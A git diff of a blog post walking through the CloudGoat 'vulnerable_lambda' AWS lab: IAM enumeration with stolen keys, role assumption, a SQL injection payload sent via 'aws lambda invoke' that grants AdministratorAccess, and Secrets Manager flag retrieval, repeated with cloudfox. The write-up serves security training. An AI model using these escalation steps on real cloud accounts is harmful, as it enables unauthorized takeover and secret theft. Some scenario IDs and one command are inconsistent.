@@ -62,7 +62,7 @@ source .venv/bin/activate
 python -m pip install -r requirements.txt
 ```
 
-### Dedicated AWS Role for CloudGoat Terraform Execution
+### Dedicated IAM Role for CloudGoat Terraform Execution
 
 When using the AWS CLI, I prefer to leverage [`aws-vault`](https://github.com/99designs/aws-vault)
 to manage credentials. Ultimately, `aws-vault` uses the OS secure keystore to 
@@ -73,7 +73,7 @@ the credentials are not hard-coded on disk in plaintext.
 ~~In an ideal world, there would be a programmatic way to craft an IAM policy for this Terraform role, but I haven't discovered one that is officially supported and simple to use (e.g., anything that's not running `terraform apply` and playing whack-a-mole with AWS API error messages).~~
 
 [Ian McKay](https://twitter.com/iann0036) to the rescue! We can utilize [iamlive](https://github.com/iann0036/iamlive) 
-to dynamically build an IAM policy for the Terraform AWS role that strictly 
+to dynamically build an IAM policy for the Terraform role that strictly 
 abides by the principle of least privilege. [This blog post](https://meirg.co.il/2021/04/23/determining-aws-iam-policies-according-to-terraform-and-aws-cli/) covers the process
 of setting up `iamlive` as a Docker container, configuring the appropriate 
 environment variables to pass HTTP/HTTPS traffic to its proxy, and collect the
@@ -142,9 +142,6 @@ aws-vault exec admin -- aws iam put-role-policy --role-name terraform-cloudgoat 
     --policy-name vulnerable_lambda --policy-document file://terraform-cloudgoat-policy.json
 ```
 
-Finally, we'll configure the profile and IP allowlist for CloudGoat and create
-the scenario. 
-
 > **NOTE:** If you've configured your CloudGoat AWS account to authenticate via
 > assumed role, you'll need to comment out the `profile` attribute within the 
 > `aws` provider block in the relevant `provider.tf` file (e.g., [here](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/vulnerable_lambda/terraform/provider.tf#L2) 
@@ -165,54 +162,103 @@ the scenario.
 > ```
 {: .prompt-warning }
 
+Finally, we'll configure the profile and IP allowlist for CloudGoat and create
+the scenario. 
+
 ```bash
 ./cloudgoat.py config profile
 ./cloudgoat.py config whitelist --auto
 aws-vault exec cloudgoat -- ./cloudgoat.py create vulnerable_lambda
 ```
 
-- Set the following environment variables to match the creds defined in `start.txt` (e.g., using `export ENV_NAME=value`)
-	- `AWS_ACCESS_KEY_ID`
-	- `AWS_SECRET_ACCESS_KEY`
-- Alternatively, add the creds to aws-vault and set the necessary values in `~/.aws/config`
-```bash
-aws-vault add bilbo
-# input access key ID and secret access key value
-cat <<EOF >> ~/.aws/config
-[profile bilbo]
-region = us-west-2
-output = json
-EOF
-```
-- First, we'll want to perform some situational awareness. In a real-life scenario, we would have just compromised the IAM user's static credentials (IAM key), and we'll need to figure out who we are and what we can do (IAM permissions).
-- Who am I?
+Once the scenario has been deployed, let's configure the "stolen" AWS access 
+key, which can be found in the `start.txt` file in the created scenario 
+directory. We can either set the `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` 
+environment variables or use the `aws-vault add` command (e.g., 
+`aws-vault add bilbo`).
+
+## Situational Awareness
+
+In a real-life scenario, we would have just compromised the IAM user's 
+credentials and we'll need to answer some initial questions before we make our 
+next move.
+
+**Who am I?** To which IAM user does the compromised access key belong?  
+**Where am I?** In which AWS account are we operating?  
+
 ```bash
 aws sts get-caller-identity
+```
+
+```json
 {
     "UserId": "AIDAW43MRFXBUNEW7N4JI",
     "Account": "REDACTED",
     "Arn": "arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgidlbywef16bt"
 }
 ```
-- What groups do I belong to?
+
+AWS account aliases could sometimes hint at the purpose of the account, and what 
+resources could be available.
+
 ```bash
-aws iam list-groups-for-user --user-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt                                                                         
+aws iam list-account-aliases     
+```
+
+```json
+{
+    "AccountAliases": []
+}
+```
+
+## Discovery
+
+Enumerating the permissions attached to an IAM user is a multi-step process, as 
+there are several methods available to grant access. Let's start with listing
+the user's group memberships.  
+
+```bash
+aws iam list-groups-for-user --user-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt
+```
+
+```json
 {
     "Groups": []
 }
 ```
-- What policies are attached to my user?
+
+It appears the user doesn't belong to any groups. What about IAM policies (both 
+managed and inline) that have been attached directly to the user? 
+
+```bash
+aws iam list-attached-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt
+```
+
+```json
+{
+    "AttachedPolicies": []
+}
+```
+
 ```bash
 aws iam list-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt
+```
+
+```json
 {
     "PolicyNames": [
         "cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer"
     ]
 }
 ```
-- What does this policy allow me to do?
+
+What permissions does this inline policy grant to the `bilbo` user?
+
 ```bash
 aws iam get-user-policy --policy-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer --user-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt
+```
+
+```json
 {
     "UserName": "cg-bilbo-vulnerable_lambda_cgidlbywef16bt",
     "PolicyName": "cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer",
@@ -223,7 +269,7 @@ aws iam get-user-policy --policy-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt-
                 "Sid": "",
                 "Effect": "Allow",
                 "Action": "sts:AssumeRole",
-                "Resource": "arn:aws:iam::940877411605:role/cg-lambda-invoker*"
+                "Resource": "arn:aws:iam::REDACTED:role/cg-lambda-invoker*"
             },
             {
                 "Sid": "",
@@ -240,24 +286,43 @@ aws iam get-user-policy --policy-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt-
     }
 }
 ```
-- The name of the role that this IAM user can assume is a bit telling ("cg-lambda-invoker"). If this role was named something else, how could we determine its capabilities?
-- Discover the full role name ("cg-lambda-invoker*" is globbed) 
+
+According to this output, the `bilbo` user is able to list and describe IAM 
+resources and simulate IAM policies. More interestingly, they are able to assume
+any role prepended with the string "cg-lambda-invoker." Let's see if such a role
+exists in the target account.  
+
 ```bash
-aws-vault exec bilbo --no-session -- aws iam list-roles --query "Roles[*].RoleName" | grep -i cg-lambda-invoker
-    "cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt",
+aws iam list-roles --query 'Roles[].RoleName' | grep -i cg-lambda-invoker
 ```
-- List policies attached to role (what permissions does it have?)
+
 ```bash
-aws iam list-role-policies --role-name cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt                 
+"cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt",
+```
+
+The name of the role that this IAM user can assume is a bit telling 
+("cg-lambda-invoker"). If this role was named something else, how could we 
+determine its capabilities? We'll need to list and describe the policies 
+attached to this role.
+
+```bash
+aws iam list-role-policies --role-name cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt   
+```
+
+```json
 {
     "PolicyNames": [
         "lambda-invoker"
     ]
 }
 ```
-- Describe the "lambda-invoker" policy
+
+What permissions does this `lambda-invoker` policy grant? 
 ```bash
 aws iam get-role-policy --policy-name lambda-invoker --role-name cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt
+```
+
+```json
 {
     "RoleName": "cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt",
     "PolicyName": "lambda-invoker",
@@ -293,41 +358,48 @@ aws iam get-role-policy --policy-name lambda-invoker --role-name cg-lambda-invok
     }
 }
 ```
-- The easiest way to assume an IAM role using the AWS CLI is configuring the IAM user's credentials in `~/.aws/config` and then adding a second profile that references the first one:  
+
+This role policy overlaps quite a bit with the inline policy attached to the 
+`bilbo` user, but there are several new Lambda actions that could lead us to 
+some interesting resources. Before we move forward, we'll need to configure the 
+AWS CLI to assume this role. The easiest way to do so is by adding a second 
+profile that references the first one in `~/.aws/config`:  
 
 ```conf
 [profile bilbo]
-region=us-west-2
 
 [profile cg-lambda-invoker]
 source_profile=bilbo
 role_arn=arn:aws:iam::REDACTED:role/cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt
 ```
-- **NOTE:** The account number 940877411605 used in the attached user policy for "bilbo" is a red herring. Use your AWS account number instead when configuring the AWS CLI. Otherwise, you'll continually receive AccessDenied errors
-	- I'm not sure why this is the case. 
-- No Lambda functions are listed when running `aws lambda list-functions --profile cg-lambda-invoker`. That's because the Lambda function was created in a specific region (and not necessarily the one you select in the profile used for CG configuration).
-- Check other regions for available Lambda functions:
+
+Now that we can assume this role from the CLI, our next task is to list all 
+Lambda functions.
+
 ```bash
-aws --profile cg-lambda-invoker lambda list-functions --region us-east-1
+aws lambda list-functions --us-east-1
+```
+
+```json
 {
     "Functions": [
         {
-            "FunctionName": "vulnerable_lambda_cgid6h7zwj2zln-policy_applier_lambda1",
-            "FunctionArn": "arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid6h7zwj2zln-policy_applier_lambda1",
+            "FunctionName": "vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1",
+            "FunctionArn": "arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1",
             "Runtime": "python3.9",
-            "Role": "arn:aws:iam::REDACTED:role/vulnerable_lambda_cgid6h7zwj2zln-policy_applier_lambda1",
+            "Role": "arn:aws:iam::REDACTED:role/vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1",
             "Handler": "main.handler",
             "CodeSize": 991559,
             "Description": "This function will apply a managed policy to the user of your choice, so long as the database says that it's okay...",
             "Timeout": 3,
             "MemorySize": 128,
-            "LastModified": "2023-01-04T01:38:32.118+0000",
+            "LastModified": "2023-02-19T19:11:38.016+0000",
             "CodeSha256": "U982lU6ztPq9QlRmDCwlMKzm4WuOfbpbCou1neEBHkQ=",
             "Version": "$LATEST",
             "TracingConfig": {
                 "Mode": "PassThrough"
             },
-            "RevisionId": "c1819257-5ad3-45b4-b1f2-ad6d3ad55e41",
+            "RevisionId": "5cc6a0d3-c4be-4a66-abcc-4601b55883e0",
             "PackageType": "Zip",
             "Architectures": [
                 "x86_64"
@@ -339,27 +411,38 @@ aws --profile cg-lambda-invoker lambda list-functions --region us-east-1
     ]
 }
 ```
-- Only one Lambda function exists in that region (lucky us). Let's take a look at its configuration and pull the code using the pre-signed URL:
+
+> **NOTE:** Lambda functions, like many AWS resources, are region-specific. As 
+> such, we should check multiple regions (if not all active ones).
+{: .prompt-info }
+
+To fully understand what this Lambda function can do, let's download the source
+code. This can be found in the `Code.Location` attribute when calling 
+`lambda:GetFunction`.
+
 ```bash
-aws --profile cg-lambda-invoker lambda get-function --function-name vulnerable_lambda_cgid6h7zwj2zln-policy_applier_lambda1 --region us-east-1
+aws lambda get-function --function-name vulnerable_lambda_cgid774pjcgkoe-policy_applier_lambda1
+```
+
+```json
 {
     "Configuration": {
-        "FunctionName": "vulnerable_lambda_cgid6h7zwj2zln-policy_applier_lambda1",
-        "FunctionArn": "arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid6h7zwj2zln-policy_applier_lambda1",
+        "FunctionName": "vulnerable_lambda_cgid774pjcgkoe-policy_applier_lambda1",
+        "FunctionArn": "arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgid774pjcgkoe-policy_applier_lambda1",
         "Runtime": "python3.9",
-        "Role": "arn:aws:iam::REDACTED:role/vulnerable_lambda_cgid6h7zwj2zln-policy_applier_lambda1",
+        "Role": "arn:aws:iam::REDACTED:role/vulnerable_lambda_cgid774pjcgkoe-policy_applier_lambda1",
         "Handler": "main.handler",
         "CodeSize": 991559,
         "Description": "This function will apply a managed policy to the user of your choice, so long as the database says that it's okay...",
         "Timeout": 3,
         "MemorySize": 128,
-        "LastModified": "2023-01-04T01:38:32.118+0000",
+        "LastModified": "2023-02-19T19:11:38.016+0000",
         "CodeSha256": "U982lU6ztPq9QlRmDCwlMKzm4WuOfbpbCou1neEBHkQ=",
         "Version": "$LATEST",
         "TracingConfig": {
             "Mode": "PassThrough"
         },
-        "RevisionId": "c1819257-5ad3-45b4-b1f2-ad6d3ad55e41",
+        "RevisionId": "5cc6a0d3-c4be-4a66-abcc-4601b55883e0",
         "State": "Active",
         "LastUpdateStatus": "Successful",
         "PackageType": "Zip",
@@ -372,10 +455,10 @@ aws --profile cg-lambda-invoker lambda get-function --function-name vulnerable_l
     },
     "Code": {
         "RepositoryType": "S3",
-        "Location": "REDACTED"
+        "Location": "https://REDACTED"
     },
     "Tags": {
-        "Name": "cg-vulnerable_lambda_cgid6h7zwj2zln",
+        "Name": "cg-vulnerable_lambda_cgid774pjcgkoe",
         "Scenario": "vulnerable-lambda",
         "Stack": "CloudGoat"
     }
@@ -383,17 +466,16 @@ aws --profile cg-lambda-invoker lambda get-function --function-name vulnerable_l
 ```
 
 ```bash
-wget https://REDACTED -O lambda_function
-
-unzip lambda_function -d lambda_function-unzipped
-ls lambda_function-unzipped 
+> wget https://REDACTED -O lambda_function
+> unzip lambda_function -d lambda_function-unzipped
+> ls lambda_function-unzipped 
 bin                                  click_default_group.py      main.py                          pytz-2021.1.dist-info  sqlite_fts4                  tabulate-0.8.9.dist-info
 click                                dateutil                    my_database.db                   requirements.txt       sqlite_fts4-1.0.1.dist-info  tabulate.py
 click-8.0.1.dist-info                dateutils                   python_dateutil-2.8.2.dist-info  six-1.16.0.dist-info   sqlite_utils
 click_default_group-1.2.2.dist-info  dateutils-0.6.12.dist-info  pytz                             six.py                 sqlite_utils-3.17.dist-info
 ```
 
-- "main.py" seems to be a reasonable starting point:  
+`main.py` seems to be a reasonable starting point!  
 
 ```python
 import boto3
@@ -451,9 +533,17 @@ if __name__ == "__main__":
     print(handler(payload, 'uselessinfo'))
 ```
 
-- Let's assume that the commented out call to `insert_all` can't be completely trusted. Trust but verify by investigating the `.db` file in the unzipped Lambda function directory:  
+This Lambda handler takes two arguments upon invocation, `user_name` (string) 
+and `policy_names` (string array). It then loops through the provided values in
+the `policy_names` argument, using each as part of a SQL statement executed 
+against `my_database.db`. If the policy name is present in the `policy_name` 
+column of the `policies` table in the database and the value of `public` is 
+`True` that IAM policy is applied to the provided username. The call to 
+`insert_all` that's commented out is left as a breadcrumb to hint at the 
+database schema. Let's verify this:  
+
 ```bash
-sqlite3 ./lambdas/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1/my_database.db 'select * from policies;'
+> sqlite3 my_database.db 'select * from policies;'
 AmazonSNSReadOnlyAccess|True
 AmazonRDSReadOnlyAccess|True
 AWSLambda_ReadOnlyAccess|True
@@ -462,24 +552,47 @@ AmazonGlacierReadOnlyAccess|True
 AmazonRoute53DomainsReadOnlyAccess|True
 AdministratorAccess|False
 ```
-- Using string formatting to dynamically generate a SQL query/statement is almost always a terrible idea. Time to hunt for and exploit a potential SQLi bug.
-- In this case, we could prematurely terminate the following SQL statement because the value of `policy` is attacker-controlled, removing the requirement of `public = 'True'`:
-	- `statement = f"select policy_name from policies where policy_name='{policy}' and public='True'"`
+
+Using string formatting to dynamically build a SQL statement without the use of 
+prepared statements opens up the application logic to risk of SQL injection 
+attacks. Directly using user input that is controllable by an attacker without
+any form of sanitization drastically increases that risk. It's time to hunt for 
+and exploit a potential SQLi bug.
+
+## Privilege Escalation
+
+In this case, we could prematurely terminate the following SQL statement because
+the value of `policy` is attacker-controlled, removing the requirement of 
+`public = 'True'`:  
+
+```python
+statement = f"select policy_name from policies where policy_name='{policy}' and public='True'"`
+```
+
 ```bash
-aws-vault exec cg-lambda-invoker -- aws lambda invoke --function-name vulnerable_lambda_cgidgfmjd1k7yo-policy_applier_lambda1 --payload '{"policy_names":["AdministratorAccess'\''; --"],"user_name":"cg-bilbo-vulnerable_lambda_cgidgfmjd1k7yo"}' --cli-binary-format raw-in-base64-out response.json --region us-east-1
+aws lambda invoke --function-name vulnerable_lambda_cgidgfmjd1k7yo-policy_applier_lambda1 --payload '{"policy_names":["AdministratorAccess'\''; --"],"user_name":"cg-bilbo-vulnerable_lambda_cgidgfmjd1k7yo"}' --cli-binary-format raw-in-base64-out response.json --region us-east-1
+```
+
+```json
 {
     "StatusCode": 200,
     "ExecutedVersion": "$LATEST"
 }
 ```
-- Check the contents of the "response.json" file for the output of this function invocation:
+
+The contents of the JSON response offer a bit more insight:  
+
 ```bash
-cat response.json                                                             
+> cat response.json                                                             
 "All managed policies were applied as expected."
 ```
-- We can verify whether or not our attempt was successful by checking the "bilbo" IAM user for additional policies (beyond the inline user policy created alongside the user):
+
+We can verify whether or not our attempt was successful by checking the `bilbo` 
+IAM user for additional policies (beyond the inline user policy created 
+alongside the user):  
+
 ```bash
-aws-vault exec bilbo --no-session -- aws iam list-attached-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidgfmjd1k7yo
+aws iam list-attached-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidgfmjd1k7yo
 {
     "AttachedPolicies": [
         {
@@ -489,45 +602,98 @@ aws-vault exec bilbo --no-session -- aws iam list-attached-user-policies --user-
     ]
 }
 ```
-- Now that we have full admin access, we can persist, move laterally, pillage secrets and source code, basically anything. Listing secrets in Secrets Manager will retrieve the scenario's flag.
 
-### Using cloudfox
+## Post-Exploitation
 
-- Assuming we started from the beginning - who am I?
+Now that we have full admin access, we can persist, move laterally, pillage 
+secrets and source code, basically anything. Listing secrets in Secrets Manager 
+will retrieve the scenario's flag.
 
 ```bash
-aws-vault exec bilbo -- aws sts get-caller-identity
+aws secretsmanager list-secrets
+```
+
+```json
 {
-    "UserId": "AIDAW43MRFXB5YQGO4KP4",
-    "Account": "REDACTED",
-    "Arn": "arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgid73or123swp"
+    "SecretList": [
+        {
+            "ARN": "arn:aws:secretsmanager:us-east-1:REDACTED:secret:vulnerable_lambda_cgid774pjcgkoe-final_flag-quMGQi",
+            "Name": "vulnerable_lambda_cgid774pjcgkoe-final_flag",
+            "LastChangedDate": "2023-02-19T14:11:26.843000-05:00",
+            "LastAccessedDate": "2023-02-18T19:00:00-05:00",
+            "Tags": [
+                {
+                    "Key": "Stack",
+                    "Value": "CloudGoat"
+                },
+                {
+                    "Key": "Name",
+                    "Value": "cg-vulnerable_lambda_cgid774pjcgkoe"
+                },
+                {
+                    "Key": "Scenario",
+                    "Value": "vulnerable-lambda"
+                }
+            ],
+            "SecretVersionsToStages": {
+                "183B5F61-1B84-4465-BDCD-13CE9953ECC2": [
+                    "AWSCURRENT"
+                ]
+            },
+            "CreatedDate": "2023-02-19T14:11:26.623000-05:00"
+        }
+    ]
 }
 ```
 
-- What IAM permissions are attached to this IAM user?
+```bash
+aws secretsmanager get-secret-value --secret-id vulnerable_lambda_cgid774pjcgkoe-final_flag  
+```
+
+```json
+{
+    "ARN": "arn:aws:secretsmanager:us-east-1:REDACTED:secret:vulnerable_lambda_cgid774pjcgkoe-final_flag-quMGQi",
+    "Name": "vulnerable_lambda_cgid774pjcgkoe-final_flag",
+    "VersionId": "183B5F61-1B84-4465-BDCD-13CE9953ECC2",
+    "SecretString": "cg-secret-846237-284529",
+    "VersionStages": [
+        "AWSCURRENT"
+    ],
+    "CreatedDate": "2023-02-19T14:11:26.837000-05:00"
+}
+```
+
+## The CloudFox Remix
+
+[Bishop Fox](https://bishopfox.com/) developed and open sourced [cloudfox](https://github.com/BishopFox/cloudfox), 
+which is a tool designed to automate the process of identifying potentially 
+exploitable attack paths within a target cloud environment. In this section, 
+we'll repeat the entire exercise using cloudfox.
+
+What IAM permissions are attached to this IAM user?
 
 ```bash
-aws-vault exec bilbo --no-session -- cloudfox aws permissions --principal arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgid73or123swp -o csv     
+> cloudfox aws permissions --principal arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgid73or123swp -o csv     
 [🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgid73or123swp
 [permissions][REDACTED-AIDAW43MRFXB5YQGO4KP4] Enumerating IAM permissions for account REDACTED.
 [permissions] Output written to [cloudfox-output/aws/REDACTED-AIDAW43MRFXB5YQGO4KP4/csv/permissions-custom-1673313531.csv]
 [permissions][REDACTED-AIDAW43MRFXB5YQGO4KP4] 5 unique permissions identified.
 ```
 
-- The loot file reads as follows:
+The loot file reads as follows:  
 
 |Service|Principal Type|Name                                     |Policy Type|Policy Name                                                    |Effect|Action                     |Resource                                         |
 |-------|--------------|-----------------------------------------|-----------|---------------------------------------------------------------|------|---------------------------|-------------------------------------------------|
-|IAM    |User          |cg-bilbo-vulnerable_lambda_cgid73or123swp|Inline     |cg-bilbo-vulnerable_lambda_cgid73or123swp-standard-user-assumer|Allow |sts:AssumeRole             |arn:aws:iam::940877411605:role/cg-lambda-invoker*|
+|IAM    |User          |cg-bilbo-vulnerable_lambda_cgid73or123swp|Inline     |cg-bilbo-vulnerable_lambda_cgid73or123swp-standard-user-assumer|Allow |sts:AssumeRole             |arn:aws:iam::REDACTED:role/cg-lambda-invoker*|
 |IAM    |User          |cg-bilbo-vulnerable_lambda_cgid73or123swp|Inline     |cg-bilbo-vulnerable_lambda_cgid73or123swp-standard-user-assumer|Allow |iam:Get*                   |*                                                |
 |IAM    |User          |cg-bilbo-vulnerable_lambda_cgid73or123swp|Inline     |cg-bilbo-vulnerable_lambda_cgid73or123swp-standard-user-assumer|Allow |iam:List*                  |*                                                |
 |IAM    |User          |cg-bilbo-vulnerable_lambda_cgid73or123swp|Inline     |cg-bilbo-vulnerable_lambda_cgid73or123swp-standard-user-assumer|Allow |iam:SimulateCustomPolicy   |*                                                |
 |IAM    |User          |cg-bilbo-vulnerable_lambda_cgid73or123swp|Inline     |cg-bilbo-vulnerable_lambda_cgid73or123swp-standard-user-assumer|Allow |iam:SimulatePrincipalPolicy|*                                                |
 
-- What are the cg-lambda-invoker roles?
+What are the cg-lambda-invoker roles?
 
 ```bash
-aws-vault exec bilbo --no-session -- cloudfox aws principals -o csv
+> cloudfox aws principals -o csv
 [🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgid73or123swp
 [principals][REDACTED-AIDAW43MRFXB5YQGO4KP4] Enumerating IAM Users and Roles for account REDACTED.
 [principals] Output written to [cloudfox-output/aws/REDACTED-AIDAW43MRFXB5YQGO4KP4/csv/principals.csv]
@@ -539,10 +705,10 @@ aws-vault exec bilbo --no-session -- cloudfox aws principals -o csv
 | IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | arn:aws:iam::REDACTED:role/cg-lambda-invoker-vulnerable_lambda_cgid73or123swp |
 | IAM | Role | vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 | arn:aws:iam::REDACTED:role/vulnerable_lambda_cgid73or123swp-policy_applier_lambda1 |
 
-- What permissions does the cg-lambda-invoker role have?
+What permissions does the cg-lambda-invoker role have?
 
 ```bash
-aws-vault exec cg-lambda-invoker -- cloudfox aws permissions --principal arn:aws:iam::REDACTED:role/cg-lambda-invoker-vulnerable_lambda_cgid73or123swp -o csv            
+> cloudfox aws permissions --principal arn:aws:iam::REDACTED:role/cg-lambda-invoker-vulnerable_lambda_cgid73or123swp -o csv            
 [🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:sts::REDACTED:assumed-role/cg-lambda-invoker-vulnerable_lambda_cgid73or123swp/1673316375681795132
 [permissions][REDACTED-AROAW43MRFXBYDQUWHENX_1673316375681795132] Enumerating IAM permissions for account REDACTED.
 [permissions] Output written to [cloudfox-output/aws/REDACTED-AROAW43MRFXBYDQUWHENX_1673316375681795132/csv/permissions-custom-1673316377.csv]
@@ -566,39 +732,39 @@ aws-vault exec cg-lambda-invoker -- cloudfox aws permissions --principal arn:aws
 | IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | iam:SimulateCustomPolicy | * |
 | IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgid73or123swp | Inline | lambda-invoker | Allow | iam:SimulatePrincipalPolicy | * |
 
-- Before we jump right to downloading the Lambda function itself, let's gather some more information:
+Before we jump right to downloading the Lambda function itself, let's gather some more information:
 
 ```bash
-aws-vault exec cg-lambda-invoker -- cloudfox aws lambda
-[🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:sts::474284633539:assumed-role/cg-lambda-invoker-vulnerable_lambda_cgidr0ub7ivite/1675228723550398160
-[lambdas][474284633539-AROAW43MRFXB7MWTALRAN_1675228723550398160] Enumerating lambdas for account 474284633539.
+> cloudfox aws lambda
+[🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:sts::REDACTED:assumed-role/cg-lambda-invoker-vulnerable_lambda_cgidr0ub7ivite/1675228723550398160
+[lambdas][REDACTED-AROAW43MRFXB7MWTALRAN_1675228723550398160] Enumerating lambdas for account REDACTED.
 [lambdas] Status: 21/21 regions complete (4 errors -- For details check /home/dominic/.cloudfox/cloudfox-error.log)
-[lambdas] Output written to [cloudfox-output/aws/474284633539-AROAW43MRFXB7MWTALRAN_1675228723550398160/table/lambdas.txt]
-[lambdas] Output written to [cloudfox-output/aws/474284633539-AROAW43MRFXB7MWTALRAN_1675228723550398160/csv/lambdas.csv]
-[lambdas][474284633539-AROAW43MRFXB7MWTALRAN_1675228723550398160] Loot written to [cloudfox-output/aws/474284633539-AROAW43MRFXB7MWTALRAN_1675228723550398160/loot/lambda-get-function-commands.txt]
-[lambdas][474284633539-AROAW43MRFXB7MWTALRAN_1675228723550398160] 1 lambdas found.
+[lambdas] Output written to [cloudfox-output/aws/REDACTED-AROAW43MRFXB7MWTALRAN_1675228723550398160/table/lambdas.txt]
+[lambdas] Output written to [cloudfox-output/aws/REDACTED-AROAW43MRFXB7MWTALRAN_1675228723550398160/csv/lambdas.csv]
+[lambdas][REDACTED-AROAW43MRFXB7MWTALRAN_1675228723550398160] Loot written to [cloudfox-output/aws/REDACTED-AROAW43MRFXB7MWTALRAN_1675228723550398160/loot/lambda-get-function-commands.txt]
+[lambdas][REDACTED-AROAW43MRFXB7MWTALRAN_1675228723550398160] 1 lambdas found.
 
-cat cloudfox-output/aws/474284633539-AROAW43MRFXB7MWTALRAN_1675228723550398160/csv/lambdas.csv
+cat cloudfox-output/aws/REDACTED-AROAW43MRFXB7MWTALRAN_1675228723550398160/csv/lambdas.csv
 Service,Region,Resource Arn,Role,isAdminRole?
-Lambda,us-east-1,vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1,arn:aws:iam::474284633539:role/vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1,No
+Lambda,us-east-1,vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1,arn:aws:iam::REDACTED:role/vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1,No
 ```
 
 What kind of permissions does this role have?
 
 ```bash
-aws-vault exec bilbo --no-session -- cloudfox aws permissions --principal arn:aws:iam::474284633539:role/vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1
-[🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:iam::474284633539:user/cg-bilbo-vulnerable_lambda_cgidr0ub7ivite
-[permissions][474284633539-AIDAW43MRFXBSQU2U7YWI] Enumerating IAM permissions for account 474284633539.
-[permissions] Output written to [cloudfox-output/aws/474284633539-AIDAW43MRFXBSQU2U7YWI/table/permissions-custom-1675229085.txt]
-[permissions] Output written to [cloudfox-output/aws/474284633539-AIDAW43MRFXBSQU2U7YWI/csv/permissions-custom-1675229085.csv]
-[permissions][474284633539-AIDAW43MRFXBSQU2U7YWI] 5 unique permissions identified.
+> cloudfox aws permissions --principal arn:aws:iam::REDACTED:role/vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1
+[🦊 cloudfox v1.9.0 🦊 ] AWS Caller Identity: arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgidr0ub7ivite
+[permissions][REDACTED-AIDAW43MRFXBSQU2U7YWI] Enumerating IAM permissions for account REDACTED.
+[permissions] Output written to [cloudfox-output/aws/REDACTED-AIDAW43MRFXBSQU2U7YWI/table/permissions-custom-1675229085.txt]
+[permissions] Output written to [cloudfox-output/aws/REDACTED-AIDAW43MRFXBSQU2U7YWI/csv/permissions-custom-1675229085.csv]
+[permissions][REDACTED-AIDAW43MRFXBSQU2U7YWI] 5 unique permissions identified.
 ```
 
 The results of the output:
 
 | Service | Principal Type | Name | Policy Type | Policy Name | Effect | Action | Resource |
 |---------|----------------|------|-------------|-------------|--------|--------|----------|
-| IAM | Role | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | iam:AttachUserPolicy | arn:aws:iam::474284633539:user/cg-bilbo-vulnerable_lambda_cgidr0ub7ivite |
+| IAM | Role | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | iam:AttachUserPolicy | arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgidr0ub7ivite |
 | IAM | Role | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | s3:GetObject | * |
 | IAM | Role | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | logs:CreateLogGroup | arn:aws:logs:*:*:* |
 | IAM | Role | vulnerable_lambda_cgidr0ub7ivite-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | logs:CreateLogStream | arn:aws:logs:*:*:log-group:*:* |
